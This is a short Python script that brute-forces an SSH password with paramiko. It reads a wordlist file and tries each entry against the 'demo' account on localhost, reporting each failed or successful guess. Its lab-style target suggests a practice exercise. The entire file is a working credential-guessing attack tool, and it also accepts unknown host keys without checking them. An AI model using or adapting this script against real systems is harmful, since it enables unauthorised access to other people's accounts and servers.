#!/usr/bin/env python

import paramiko

ssh = paramiko.SSHClient()

ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

with open('passwdList.txt', mode='r') as passwdListF:
    passwdList = passwdListF.readlines()
    

for password in passwdList:
    password =  password.strip()
    try:
        print "Attempting to connect with password:%s"%password
        ssh.connect('localhost', username='demo', password=password)

    except paramiko.AuthenticationException:
        print "[-]  Password is incorrect\n"        
        pass
    
    else:
        print "[+] Password is Correct!!!"
    
    

ssh.close()

